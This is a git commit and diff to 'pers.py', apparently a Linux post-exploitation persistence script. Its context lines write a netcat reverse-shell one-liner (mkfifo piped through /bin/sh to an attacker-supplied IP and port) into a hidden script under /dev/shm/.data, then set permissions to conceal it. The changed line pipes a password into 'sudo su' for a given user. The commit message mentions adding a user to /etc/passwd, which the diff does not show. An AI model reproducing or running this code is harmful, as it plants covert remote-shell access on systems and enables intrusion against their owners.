a8551859c22dec891298b92851c56978c787a1bd
cysec11 <84633135+cysec11@users.noreply.github.com>
2023-04-01 14:32:36 -0400

    Update pers.py
    add line to add user to /etc/passwd

--- pers.py
+++ pers.py
@@ -80,7 +80,7 @@ def callback(local_ip, local_port, username, password):
 		os.system("touch /dev/shm/.data/data-log.sh")
 		os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
 		os.system("chown {} /dev/shm/.data/".format(username))
-		os.system("echo {} | sudo su root1".format(password))
+		os.system("echo {} | sudo su {}".format(password,username))
 		os.system("chmod 100 /dev/shm/.data/data-log.sh")
 		os.system("chmod 700 /dev/shm/.data/")
 		print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
